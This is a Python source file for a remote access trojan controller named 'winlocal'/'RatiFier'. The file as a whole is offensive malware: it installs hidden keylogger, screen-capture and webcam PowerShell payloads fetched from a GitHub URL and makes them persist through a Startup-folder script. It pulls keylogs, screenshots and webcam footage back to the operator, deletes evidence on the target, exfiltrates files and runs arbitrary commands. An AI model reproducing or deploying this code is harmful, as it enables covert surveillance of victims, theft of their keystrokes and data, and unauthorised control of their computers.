#!/usr/bin/python
# python console

# imports
import os
import sys
import random as r
from datetime import datetime
import getpass

# variables
banner = """

 /$$$$$$$              /$$     /$$  /$$$$$$  /$$                    
| $$__  $$            | $$    |__/ /$$__  $$|__/                    
| $$  \ $$  /$$$$$$  /$$$$$$   /$$| $$  \__/ /$$  /$$$$$$   /$$$$$$ 
| $$$$$$$/ |____  $$|_  $$_/  | $$| $$$$    | $$ /$$__  $$ /$$__  $$
| $$__  $$  /$$$$$$$  | $$    | $$| $$_/    | $$| $$$$$$$$| $$  \__/
| $$  \ $$ /$$__  $$  | $$ /$$| $$| $$      | $$| $$_____/| $$      
| $$  | $$|  $$$$$$$  |  $$$$/| $$| $$      | $$|  $$$$$$$| $$      
|__/  |__/ \_______/   \___/  |__/|__/      |__/ \_______/|__/

            [::] The RAT You'll Ever Need [::]
                [::] Created by: RAT [::]
"""
help_menu = """
        Arguments:
            <username>.rat = configuration file

        Example:
            winlocal.rat
"""
options_menu = """
        [+] Command and Control:
            [orconsole] ------ Remote Console
            [fix orconsole] -- Fix Remote Console
            [upload] --------- Upload Files to Target PC
            [download] ------- Download Files from Target PC
            [restart] -------- Restart Target PC
            [shutdown] ------- Shutdown Target PC
            [killswitch] ----- Removes winlocal From Target

        [+] Reconnaissance:
            [install keylogger] ------ Install Keylogger
            [install screencapture] -- Install Screen Capture
            [install webcam] --------- Install Webcam capture
            [grab keylogs] ----------- Grab Keylogs
            [take screenshot] -------- Take Screenshot
            [grab webcam] ------------ Grab Webcam Footage

        [+] Options:
            [help] ------- Help Menu
            [man] -------- Ratifier Manual
            [config] ----- Display Configuration File
            [version] ---- Version Number
            [update] ----- Update Ratifier
            [uninstall] -- Uninstall Ratifier
            [quit] ------- Quit

            * any other command will be
              sent through your terminal

        [+] Select an [option] ...

"""
username = getpass.getuser() # gets username
header = f"{username}@winlocal $ " # sets up user input interface
remote_path = "https://github.com/gozen-foto/zebroy/tree/main" # url path for winlocal files
local_path = f"/home/{username}/.winlocal" if username != "root" else f"/root/.winlocal" # gets path of winlocal

# random text generator for obuscation
def random_text(length=5):
    lower_case = "abcdefghijklmnopqrstuvwxyz"
    upper_case = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"

    characters = lower_case + upper_case
    generated_text = ""

    for i in range(length):
        generated_text += r.choice(list(characters))

    return generated_text

# read config file
def read_config(config_file):
    configuration = {}

    # get file contents
    read_lines = open(config_file, "r").readlines()

    # get target configuration
    configuration["IPADDRESS"] = read_lines[0].strip()
    configuration["PASSWORD"] = read_lines[1].strip()
    configuration["WORKINGDIRECTORY"] = (read_lines[2]).replace("\\", "/").strip()
    configuration["STARTUPDIRECTORY"] = (read_lines[3]).replace("\\", "/").strip()

    return configuration

# display configuration file data
def print_config(configuration):

    for key, value in configuration.items():
        print(f"{key}: {value}")

# clear screen
def clear():
    os.system("clear")

# terminate program
def exit():
    print("\n[+] Exiting ... ")
    sys.exit()

# gets current date and time
def current_date():
    current = datetime.now()

    return current.strftime("%Y-%m-%d %H:%M:%S")
    
# connects rat to target
def connect(address, password):
    print("\n[*] Connecting to target ... ")
    # remotely connect
    os.system(f"sshpass -p \"{password}\" ssh winlocal@{address}")

# remote uploads with SCP
def remote_upload(address, password, upload_file, path):
    print("\n[*] Uploading file ... ")
    # scp upload
    os.system(f"sshpass -p \"{password}\" scp {upload_file} winlocal@{address}:{path}")
    print("\n[+] upload complete\n")

# remote downloads with SCP
def remote_download(address, password, path):
    print("\n[*] Downloading file ... ")
    # scp download
    os.system(f"mkdir ~/Download")
    os.system(f"sshpass -p \"{password}\" scp winlocal@{address}:{path} ~/Downloads")
    print("\n[+] Download saved to \"~/Downloads\"\n")

# run commands remotely with SCP
def remote_command(address, password, command):
    # remote command execution
    os.system(f"sshpass -p \"{password}\" ssh winlocal@{address} \"{command}\"")

# keylogger
def keylogger(address, password, username, working_directory):

    print("\n [*] Prepping keylogger ... ")
    # web requests
    keylogger_command = f"powershell powershell.exe -Windowstyle hidden \"Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/paypack/keycap/keycap.ps1 -OutFile {working_directory}/keycap.ps1\""
    controller_command = f"cd C:/Users/{username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && echo powershell Start-Process powershell.exe -Windowstyle hidden $env:temp/keycap.ps1 >> coller.cmd"
    print("\n[+] Keylogger prepped")

    # installing keylogger
    print("\n[*] Installing keylogger ... ")
    remote_command(address, password, keylogger_command)
    print("\n[*] Installing controller ... ")
    remote_command(address, password, controller_command)
    print("\n[+] Keylogger Installed successfully\n")

    # execute logger
    print("\n[!] Restart target computer to execute keylogger ... \n")

# takes screenshot of target computer
def grab_screenshots (address, password, working_directory, username):
    # download screenshot
    print("\n[*] Downloading screenshots ... ")
    screenshot_location = f"{working_directory}/dshot"
    remote_download (address, password, screenshot_location)
    print("[+] Screenshots downloaded")

    # formatting screenshots
    print("[*] Fromatting screenshots ")
    loot_folder = f"dshot-{username}-{current_date()}"
    os.system(f"mkdir ~/Downloads/{loot_folder}")
    os.system(f"mv ~/Downloads/dshot/* ~/Downloads/{loot_folder}")
    os.system(f"rm -rf ~/Downloads/dshot")
    print("[+] Screenshots formatted") 

    # deletes screenshots off of target
    print("[*] Covering tracks ")
    delete_screenshots = f"powershell Remove-Item {working_directory}/dshot/* -Force"
    remote_command(address, password, delete_screenshots)
    print("[+] Screenshots downloaded")

    # confirmation
    print("\n[+] Screenshots saved to \"~/Downloads\"")

# grab webcam footage of target computer
def grab_webcam(address, password, working_directory, username):
    # download webcam footage
    print("\n[*] Downloading webcam footage ... ")
    webcam_location = f"{working_directory}/WCC"
    remote_download (address, password, webcam_location)
    print("[+] Webcam footage downloaded")

    # formatting webcam footage
    print("[*] Fromatting webcam footage ")
    loot_folder = f"WCC-{username}-{current_date()}"
    os.system(f"mkdir ~/Downloads/{loot_folder}")
    os.system(f"mv ~/Downloads/WCC/* ~/Downloads/{loot_folder}")
    os.system(f"rm -rf ~/Downloads/WCC")
    print("[+] Webcam footage formatted") 

    # deletes webcam footage off of target
    print("[*] Covering tracks ")
    delete_webcam = f"powershell Remove-Item {working_directory}/WCC/* -Force"
    remote_command(address, password, delete_webcam)
    print("[+] Webcam footage deleted from target")

     # confirmation
    print("\n[+] Webcam footage saved to \"~/Downloads\"")

# killswitch
def killswitch(address, password, working_directory, username):
    print("\n[*] Executing killswitch ... ")
    # web request
    killswitch_command = f"powershell /c cd C:; Remove-Item {working_directory}/* -r -Recurse -Force; Remove-WindowsCapability -Online -Name OpenSSH Server~~~~0.0.1.0; Remove-Item \"C:/Users/winlocal\" -r -Recurse -Force; Remove-LocalUser -Name \"winlocal\"; shutdown /r /t 0"
    print("\n[+] Killswitch prepped")

    # installing killswitch
    remote_command(address, password, f"cd C:/Users/{username}/AppData/Roaming/Microsoft/Windows/ && cd \"Start Menu\" && cd Programs/Startup && del coller.cmd")
    remote_command(address, password, killswitch_command)
    print("\n[+] Killswitch Executed successfully\n")

# custom upload
def upload(address, password, working_directory):

    # get upload file
    print("\n[~] Enter file you wish to upload:")
    upload_file = input(f"{header}")

    # upload flie
    print("\n[*] Uploading file ... ")
    remote_upload(address, password, upload_file, working_directory)
    print(f"\n[+] Upload successfully to \"{working_directory}\"\n")

# custom download
def download(address, password):
    # get download path
    print("\n[~] Enter path of file you wish to download:")
    download_path = input(f"{header}")

    # download file
    print("\n[*] Downloading file ... ")
    remote_download(address, password, download_path)

# update
def update():

    print("\n[+] Checking for updates ... ")

    # get latest version number
    os.system(f"curl https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/version.txt | tee ~/.winlocal/latest.txt")

    # save latest version number to memory
    current_version = float(open(f"{local_path}/version.txt", "r").read().strip())
    latest_version = float(open(f"{local_path}/latest.txt", "r").read().strip())

    # delete latest version number from memory
    os.system(f"rm -rf ~/.winlocal/latest.txt")

    # compare versions
    if latest_version > current_version:
        print("\n[+] Update found")
        print("[*] Update winlocal? [y/n]\n")

        # user input, option
        option = input(f"{header}")

        # update
        if option == "y" or option == "yes":
            os.system(f"sh ~/.winlocal/paypacks/update.sh")
            print("\n[+] winlocal updated successfully")

        # exception
        else:
            main()

    # otherwise, run main code
    else:
        print("\n[+] winlocal already up to date")
        print("\n[*] Hit any key to continue ... \n")
        input(f"{header}")
        main()

# unstalls winlocal
def remove():
    # confirmation
    print("\n[!] Are you sure you want to remove winlocal? [y/n]\n")

    # user input
    option = input(f"{header}")

    # delete winlocal
    if option == "y":
        os.system(f"rm -rf ~/.winlocal")
    
    # cancel
    elif option == "n":
        main()

# listener
def listener():
    pass

# command line interface
def cli(arguments):
    # display banner
    clear()
    print(banner)

    # if arguments exist
    if arguments:
        print("\t[~] Type \"help\" for help menu :\n")

        # loop user input
        while True:

            # user input, option
            option = input(f"{header}")

            # check if config file exists
            try:
                configuration = read_config(sys.argv[1])

            except FileNotFoundError:
                print("\n[!!] File does not exist [!!]")
                exit()

            # get config info
            ipv4 = configuration("IPADDRESS")
            password = configuration("PASSWORD")
            working_directory = configuration.get("WORKINGDIRECTORY")
            startup_directory = configuration.get("STARTUPDIRECTORY")
            target_username = working_directory[9:-19] # gets username from working directory

            # remote console
            if option == "orconsole":
                connect(ipv4, password)

            # fix remote console
            elif option == "fix orconsole":
                os.system(f"sh {local_path}/paypacks/fix-console.sh {local_path} {ipv4} {password}")

            # keelogger option
            elif option == "install keylogger":
                keylogger(ipv4, password, target_username, working_directory)

            # grab keylogs option
            elif option == "grab keylogs":
                remote_download(ipv4, password, f"{working_directory}/{target_username}.log")
                remote_command(ipv4, password, f"powershell New-Item -Path {working_directory}/{target_username}.log -ItemType File -Force")

                print("[+] Log file saved to \"~/Downloads\"")
                print("[+] Log file on target has been wiped\n")

            # install screencapture option
            elif option == "install screencapture":
                print("\n[*] Installing screencapture ... ")
                install_screencapture = f"powershell powershell.exe -Windowstyle hidden \"Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/paypack/dcap/dshot.ps1 -OutFile {working_directory}/dshot.ps1\""
                add_to_startup = f"cd C:/Users/{target_username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && echo powershell Start-Process powershell.exe -Windowstyle hidden $env:temp/dshot.ps1 >> coller.cmd"

                remote_command(ipv4, password, install_screencapture)
                remote_command(ipv4, password, add_to_startup)
                print("\n[+] Screencapture installed successfully\n")
                print("\n[!] Restart target computer to execute screencapture ... \n")

            # grab screenshots option
            elif option == "grab screenshots":
                grab_screenshots(ipv4, password, working_directory, target_username)

            # custom upload option
            elif option == "upload":
                upload(ipv4, password, working_directory)

            # custom download option
            elif option == "download" or option == "exfiltrate":
                download(ipv4, password)

            # restart target option
            elif option == "restart":
                remote_command(ipv4, password, "shutdown /r /t 0")

            # shutdown target option
            elif option == "shutdown":
                remote_command(ipv4, password, "shutdown /s /t 0")

            # install webcam option
            elif option == "install webcam":
                install_webcam = f"powershell powershell.exe -Windowstyle hidden \"Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/paypack/camcap/camcap.ps1 -OutFile {working_directory}/camcap.ps1\""
                add_to_startup = f"cd C:/Users/{target_username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && echo powershell Start-Process powershell.exe -Windowstyle hidden $env:temp/camcap.ps1 >> coller.cmd"

                remote_command(ipv4, password, install_webcam)
                remote_command(ipv4, password, add_to_startup)

                print("\n[+] Webcam capture installed successfully\n")
                print("\n[!] Restart target computer to execute webcam capture ... \n")

            # grab webcam footage option
            elif option == "grab webcam":
                grab_webcam(ipv4, password, working_directory, target_username)
            
            # help me
            elif option == "help":
                print(banner)
                print(options_menu)

            # display config file info
            elif option == "config":
                print_config(configuration)
                print(f"USERNAME: {target_username}")
            
            # get version number
            elif option == "version":
                os.system(f"cat {local_path}/version.txt")

            # update option
            elif option == "update":
                update()
                exit()

            # kill switch option
            elif option == "killswitch":
                print("\n[!!] WARNING: This will remove winlocal from the target computer and restart it. Are you sure you want to continue? [y/n]\n")
                confirm = input(f"{header}")
                if confirm == "y":
                    killswitch(ipv4, password, working_directory, target_username)
                else:
                    main()

            # manual option
            elif option == "man" or option == "manual":
                #os.system(f"xdg-open https://.../manual.md")
                print("\n[+] Manual coming soon ... \n")

            # remove installation
            elif option == "remove" or option == "uninstall":
                remove()

            # quit option
            elif option == "quit" or option == "exit":
                exit()

            # exception
            else:
                os.system(option)

            # new line for cleaner UI
            print("\n")

    # if arguments don't exist
    else:
        print(help_menu)

# main code
def main():
    # clear screen
    clear()
    
    # checks for arguments
    try:
        sys.argv[1]
    except IndexError:
        arguments_exist = False
    else:
        arguments_exist = True
    
    # run command line interface
    cli(arguments_exist)

# run main code
if __name__ == "__main__":
    main()
